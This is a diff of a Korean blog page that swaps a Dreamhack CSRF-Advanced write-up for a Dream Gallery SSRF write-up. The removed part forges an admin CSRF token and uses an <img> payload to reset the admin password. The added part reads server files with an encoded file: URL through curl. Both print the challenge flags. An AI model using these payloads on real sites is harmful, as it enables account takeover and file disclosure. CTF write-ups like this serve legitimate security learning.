@@ -36,27 +36,27 @@
   
     <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.3.2" />
-<meta property="og:title" content="[Dreamhack] CSRF-Advanced 해설" />
+<meta property="og:title" content="[Dreamhack] Dream Gallery 해설" />
 <meta name="author" content="박지율" />
 <meta property="og:locale" content="en" />
 <meta name="description" content="문제 특징" />
 <meta property="og:description" content="문제 특징" />
-<link rel="canonical" href="http://localhost:4000/posts/Dreamhack_CSRF-Advanced/" />
-<meta property="og:url" content="http://localhost:4000/posts/Dreamhack_CSRF-Advanced/" />
+<link rel="canonical" href="http://localhost:4000/posts/Dreamhack_Dream-Gallery/" />
+<meta property="og:url" content="http://localhost:4000/posts/Dreamhack_Dream-Gallery/" />
 <meta property="og:site_name" content="jyp_devlog" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2026-06-09T12:00:04+09:00" />
+<meta property="article:published_time" content="2026-06-09T12:00:08+09:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="[Dreamhack] CSRF-Advanced 해설" />
+<meta property="twitter:title" content="[Dreamhack] Dream Gallery 해설" />
 <meta name="twitter:site" content="@twitter_username" />
 <meta name="twitter:creator" content="@박지율" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"박지율","url":"https://github.com/1221jyp"},"dateModified":"2026-06-10T02:38:26+09:00","datePublished":"2026-06-09T12:00:04+09:00","description":"문제 특징","headline":"[Dreamhack] CSRF-Advanced 해설","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Dreamhack_CSRF-Advanced/"},"url":"http://localhost:4000/posts/Dreamhack_CSRF-Advanced/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"박지율","url":"https://github.com/1221jyp"},"dateModified":"2026-06-09T12:00:08+09:00","datePublished":"2026-06-09T12:00:08+09:00","description":"문제 특징","headline":"[Dreamhack] Dream Gallery 해설","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Dreamhack_Dream-Gallery/"},"url":"http://localhost:4000/posts/Dreamhack_Dream-Gallery/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
 
-  <title>[Dreamhack] CSRF-Advanced 해설 | jyp_devlog
+  <title>[Dreamhack] Dream Gallery 해설 | jyp_devlog
   </title>
 
   <!--
@@ -431,7 +431,7 @@
         
 
           
-            <span>[Dreamhack] CSRF-Advanced 해설</span>
+            <span>[Dreamhack] Dream Gallery 해설</span>
           
 
         
@@ -614,18 +614,6 @@
       
 
     
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
 
     
 
@@ -651,7 +639,7 @@
 
 <!-- return -->
 
-<h1 data-toc-skip>[Dreamhack] CSRF-Advanced 해설</h1>
+<h1 data-toc-skip>[Dreamhack] Dream Gallery 해설</h1>
 
 <div class="post-meta text-muted">
   <!-- published date -->
@@ -666,7 +654,7 @@
 
 
 <em class=""
-    data-ts="1780974004"
+    data-ts="1780974008"
     data-df="ll"
     data-toggle="tooltip" data-placement="bottom">
   Jun  9, 2026
@@ -675,25 +663,6 @@
   </span>
 
   <!-- lastmod date -->
-  
-  <span>
-    Updated <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-
-<em class=""
-    data-ts="1781026706"
-    data-df="ll"
-    data-toggle="tooltip" data-placement="bottom">
-  Jun 10, 2026
-</em>
-
-  </span>
    
 
   <div class="d-flex justify-content-between">
@@ -734,8 +703,8 @@
 
 <!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="705 words">
-  <em>3 min</em> read</span>
+  title="378 words">
+  <em>2 min</em> read</span>
 
     </div>
   </div>
@@ -746,10 +715,10 @@
 <div class="post-content"><h1 id="문제-특징">문제 특징</h1>
 
 <blockquote>
-  <p>CSRF 해킹 기법을 이용하여 어드민 비밀번호 바꾸기</p>
+  <p>악성 파일을 업로드하는 해킹 기법</p>
 </blockquote>
 
-<h2 id="난이도-lv1"><span class="mr-2"><strong>난이도</strong>: Lv.1</span><a href="#난이도-lv1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<h2 id="난이도-lv2"><span class="mr-2"><strong>난이도</strong>: Lv.2</span><a href="#난이도-lv2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 <h2 id="카테고리-웹해킹"><span class="mr-2"><strong>카테고리</strong>: 웹해킹</span><a href="#카테고리-웹해킹" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
 <hr />
@@ -763,18 +732,8 @@
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
-4
-5
-6
-7
-8
 </pre></td><td class="rouge-code"><pre>/
-├── deploy
-│   ├── app.py
-│   ├── flag.txt
-│   ├── requirements.txt
-│   ├── static
-│   └── templates
+├── app.py
 └── Dockerfile
 </pre></td></tr></tbody></table></code></div></div>
 
@@ -807,176 +766,67 @@
 23
 24
 25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-45
-46
-47
-48
-49
-50
-51
-52
-53
-54
-55
-56
-57
-58
-59
-60
-61
-62
-63
-64
-65
 </pre></td><td class="rouge-code"><pre>
 <span class="c1">#app.py
 </span>
-<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">mini_database</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
-    <span class="n">session_id</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">sessionid</span><span class="sh">'</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">view</span><span class="sh">'</span><span class="p">))</span>
+
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/request</span><span class="sh">'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">url_request</span><span class="p">():</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">url</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">).</span><span class="nf">lower</span><span class="p">()</span>
+    <span class="n">title</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">title</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">url</span> <span class="o">==</span> <span class="sh">''</span> <span class="ow">or</span> <span class="n">url</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="sh">"</span><span class="s">file://</span><span class="sh">"</span><span class="p">)</span> <span class="ow">or</span> <span class="sh">"</span><span class="s">flag</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">url</span> <span class="ow">or</span> <span class="n">title</span> <span class="o">==</span> <span class="sh">''</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">request.html</span><span class="sh">'</span><span class="p">)</span>
+
     <span class="k">try</span><span class="p">:</span>
-        <span class="n">username</span> <span class="o">=</span> <span class="n">session_storage</span><span class="p">[</span><span class="n">session_id</span><span class="p">]</span>
-    <span class="k">except</span> <span class="nb">KeyError</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="sh">'</span><span class="s">please login</span><span class="sh">'</span><span class="p">)</span>
-
-    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="sa">f</span><span class="sh">'</span><span class="s">Hello </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="sh">"</span><span class="s">flag is </span><span class="sh">"</span> <span class="o">+</span> <span class="n">FLAG</span> <span class="k">if</span> <span class="n">username</span> <span class="o">==</span> <span class="sh">"</span><span class="s">admin</span><span class="sh">"</span> <span class="k">else</span> <span class="sh">"</span><span class="s">you are not an admin</span><span class="sh">"</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
-
-
-<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/flag</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
-<span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
-    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">"</span><span class="s">flag.html</span><span class="sh">"</span><span class="p">)</span>
-    <span class="k">elif</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
-        <span class="n">param</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">param</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span>
-        <span class="k">if</span> <span class="ow">not</span> <span class="nf">check_csrf</span><span class="p">(</span><span class="n">param</span><span class="p">):</span>
-            <span class="k">return</span> <span class="sh">'</span><span class="s">&lt;script&gt;alert(</span><span class="sh">"</span><span class="s">wrong??</span><span class="sh">"</span><span class="s">);history.go(-1);&lt;/script&gt;</span><span class="sh">'</span>
-
-        <span class="k">return</span> <span class="sh">'</span><span class="s">&lt;script&gt;alert(</span><span class="sh">"</span><span class="s">good</span><span class="sh">"</span><span class="s">);history.go(-1);&lt;/script&gt;</span><span class="sh">'</span>
-
-
-<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/login</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
-<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
-    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">login.html</span><span class="sh">'</span><span class="p">)</span>
-    <span class="k">elif</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
-        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span>
-        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">)</span>
-        <span class="k">try</span><span class="p">:</span>
-            <span class="n">pw</span> <span class="o">=</span> <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">]</span>
-        <span class="k">except</span><span class="p">:</span>
-            <span class="k">return</span> <span class="sh">'</span><span class="s">&lt;script&gt;alert(</span><span class="sh">"</span><span class="s">user not found</span><span class="sh">"</span><span class="s">);history.go(-1);&lt;/script&gt;</span><span class="sh">'</span>
-        <span class="k">if</span> <span class="n">pw</span> <span class="o">==</span> <span class="n">password</span><span class="p">:</span>
-            <span class="n">resp</span> <span class="o">=</span> <span class="nf">make_response</span><span class="p">(</span><span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">index</span><span class="sh">'</span><span class="p">))</span> <span class="p">)</span>
-            <span class="n">session_id</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">8</span><span class="p">).</span><span class="nf">hex</span><span class="p">()</span>
-            <span class="n">session_storage</span><span class="p">[</span><span class="n">session_id</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
-            <span class="n">token_storage</span><span class="p">[</span><span class="n">session_id</span><span class="p">]</span> <span class="o">=</span> <span class="nf">md5</span><span class="p">((</span><span class="n">username</span> <span class="o">+</span> <span class="n">request</span><span class="p">.</span><span class="n">remote_addr</span><span class="p">).</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">hexdigest</span><span class="p">()</span>
-            <span class="n">resp</span><span class="p">.</span><span class="nf">set_cookie</span><span class="p">(</span><span class="sh">'</span><span class="s">sessionid</span><span class="sh">'</span><span class="p">,</span> <span class="n">session_id</span><span class="p">)</span>
-            <span class="k">return</span> <span class="n">resp</span> 
-        <span class="k">return</span> <span class="sh">'</span><span class="s">&lt;script&gt;alert(</span><span class="sh">"</span><span class="s">wrong password</span><span class="sh">"</span><span class="s">);history.go(-1);&lt;/script&gt;</span><span class="sh">'</span>
-
-
-<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/change_password</span><span class="sh">"</span><span class="p">)</span>
-<span class="k">def</span> <span class="nf">change_password</span><span class="p">():</span>
-    <span class="n">session_id</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">sessionid</span><span class="sh">'</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">username</span> <span class="o">=</span> <span class="n">session_storage</span><span class="p">[</span><span class="n">session_id</span><span class="p">]</span>
-        <span class="n">csrf_token</span> <span class="o">=</span> <span class="n">token_storage</span><span class="p">[</span><span class="n">session_id</span><span class="p">]</span>
-    <span class="k">except</span> <span class="nb">KeyError</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="sh">'</span><span class="s">please login</span><span class="sh">'</span><span class="p">)</span>
-    <span class="n">pw</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">pw</span><span class="sh">"</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">pw</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">change_password.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">csrf_token</span><span class="o">=</span><span class="n">csrf_token</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="k">if</span> <span class="n">csrf_token</span> <span class="o">!=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">csrftoken</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">):</span>
-            <span class="k">return</span> <span class="sh">'</span><span class="s">&lt;script&gt;alert(</span><span class="sh">"</span><span class="s">wrong csrf token</span><span class="sh">"</span><span class="s">);history.go(-1);&lt;/script&gt;</span><span class="sh">'</span>
-        <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">]</span> <span class="o">=</span> <span class="n">pw</span>
-        <span class="k">return</span> <span class="sh">'</span><span class="s">&lt;script&gt;alert(</span><span class="sh">"</span><span class="s">Done</span><span class="sh">"</span><span class="s">);history.go(-1);&lt;/script&gt;</span><span class="sh">'</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="nf">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
+        <span class="n">mini_database</span><span class="p">.</span><span class="nf">append</span><span class="p">({</span><span class="n">title</span><span class="p">:</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)})</span>
+        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">view</span><span class="sh">'</span><span class="p">))</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">"</span><span class="s">request.html</span><span class="sh">"</span><span class="p">)</span>
 
 
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>이 문제는 문제의 제목 그대로 <code class="language-plaintext highlighter-rouge">CSRF</code> 해킹 기법을 활용하여 푸는 문제로, <a href="https://1221jyp.com/posts/Dreamhack_CSRF-Advanced/">csrf-2</a>와 똑같은 문제이지만, 가장 큰 다름점으로는 <code class="language-plaintext highlighter-rouge">csrf_token</code>이 걸려있다는 점이다.</p>
+<p>이 문제는 서버측에 파일 업로드를 요청해주면 업로드를 해주는 구조다.</p>
 
 <h1 id="풀이">풀이</h1>
 
-<h2 id="csrf-토큰이란-by-claude-code"><span class="mr-2">CSRF 토큰이란? By claude code</span><a href="#csrf-토큰이란-by-claude-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<h2 id="ssrf란"><span class="mr-2">SSRF란?</span><a href="#ssrf란" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<p><strong>CSRF 토큰은 “이 요청이 진짜 우리 사이트의 정상 폼에서 나온 것인지” 확인하기 위한 예측 불가능한 랜덤 비밀값입니다.</strong></p>
+<p><strong>SSRF (Server-Side Request Forgery, 서버 사이드 요청 위조) 는 서버가 공격자 대신 요청을 보내게 만드는 취약점입니다.</strong></p>
 
-<blockquote>
-  <p>왜 필요한가?</p>
-</blockquote>
+<h2 id="데이터-불러오기"><span class="mr-2">데이터 불러오기</span><a href="#데이터-불러오기" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<p>브라우저는 요청 시 쿠키를 자동 첨부합니다. 그래서 쿠키만으로는 “정상 요청”과 “공격자가 유도한 위조 요청”을 구분할 수 없습니다.</p>
+<p>이 웹 서버는 사용자가 입력한 URL을 받아 서버가 직접 그 주소로 요청을 보내 데이터를 가져오는 기능이 있다.</p>
 
-<h2 id="고정된-csrf_token"><span class="mr-2">고정된 csrf_token</span><a href="#고정된-csrf_token" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-
-<div class="language-python highlighter-rouge"><div class="code-header">
-        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre><span class="n">token_storage</span><span class="p">[</span><span class="n">session_id</span><span class="p">]</span> <span class="o">=</span> <span class="nf">md5</span><span class="p">((</span><span class="n">username</span> <span class="o">+</span> <span class="n">request</span><span class="p">.</span><span class="n">remote_addr</span><span class="p">).</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">hexdigest</span><span class="p">()</span>
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>csrf_token이 제대로 작동하기 위해선 서버에서 항상 랜덤한 token값을 client에게 보내주어야 하지만, 현재 이 서버에서 전송하고 있는 csrf_token 유저별로 고정된 값임을 확인해볼 수 있다.
-따라서, 어드민의 id와 ip주소를 알고있다면 csrf_token을 탈취 할 수 있는 것이다.</p>
-
-<p>id : admin
-address : 127.0.0.1 
-이므로</p>
-
-<p>파이썬 창을 열어 csrf_token값을 얻어준다.</p>
-
-<div class="language-python highlighter-rouge"><div class="code-header">
-        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre><span class="nf">print</span><span class="p">(</span><span class="nf">md5</span><span class="p">((</span><span class="sh">"</span><span class="s">admin</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span><span class="p">).</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">hexdigest</span><span class="p">())</span>
-</pre></td></tr></tbody></table></code></div></div>
-
-<blockquote>
-  <blockquote>
-    <p>7505b9c72ab4aa94b1a4ed7b207b67fb</p>
-  </blockquote>
-</blockquote>
+<p>file:이라는 스키마를 사용하면 서버의 파일을 불러올 수 있다. 하지만 이 문제에는 여러가지 필터가 있으므로, 이를 우회해야 한다.</p>
 
 <h2 id="페이로드"><span class="mr-2">페이로드</span><a href="#페이로드" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<div class="language-html highlighter-rouge"><div class="code-header">
-        <span data-label-text="HTML"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"/change_password?pw=1234&amp;csrftoken=7505b9c72ab4aa94b1a4ed7b207b67fb"</span><span class="nt">&gt;</span>
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>해당 페이로드를 <code class="language-plaintext highlighter-rouge">/flag</code>의 <code class="language-plaintext highlighter-rouge">&lt;input&gt;</code> 박스에 넣고 전송하면 어드민의 비밀번호가 바뀌게 된다.</p>
-
-<h2 id="어드민-로그인"><span class="mr-2">어드민 로그인</span><a href="#어드민-로그인" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-
-<p>이제 로그인 창으로 이동하여
-id : admin
-pw : 1234
-를 입력해보자.</p>
+<ol>
+  <li>
+    <p>flag 파일 읽어서 갤러리에 저장
+curl “http://타겟주소/request?url=file:/fl%2561g.txt&amp;title=pwn”</p>
+  </li>
+  <li>
+    <p>저장된 base64 값 확인 (읽은 데이터는 base64로 인코딩되어 /view에 저장됨)
+curl “http://타겟주소/view”</p>
+  </li>
+  <li>
+    <p>base64 디코딩
+echo “찾은base64값” | base64 -d</p>
+  </li>
+</ol>
 
 <h1 id="정답">정답</h1>
 
-<p>DH{77bb582329a1b2fc9f8dc2a50b70d586}</p>
+<p>DH{b2037a026b40cc98804e91b5a2a07f54}</p>
 </div>
 
 <div class="post-tail-wrapper text-muted">
@@ -1291,59 +1141,59 @@ pw : 1234
   
 
   
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
   
 
   
@@ -1761,16 +1611,16 @@ banlist = [&quot;`&quot;,&quot;&#39;&quot;,&quot;alert(&quot;,&quot;fetch(...
 
 <div class="post-navigation d-flex justify-content-between">
   
-  <a href="/posts/Dreamhack_csrf-2/" class="btn btn-outline-primary"
+  <a href="/posts/Dreamhack_simple-ssti/" class="btn btn-outline-primary"
     prompt="Older">
-    <p>[Dreamhack] csrf-2 해설</p>
+    <p>[Dreamhack] simple-ssti 해설</p>
   </a>
   
 
   
-  <a href="/posts/Dreamhack_XSS-Filtering-Bypass-Advanced/" class="btn btn-outline-primary"
+  <a href="/posts/Dreamhack_Command-Injection-Advanced/" class="btn btn-outline-primary"
     prompt="Newer">
-    <p>[Dreamhack] XSS Filtering Bypass Advanced 해설</p>
+    <p>[Dreamhack] Command Injection Advanced 해설</p>
   </a>
   
 
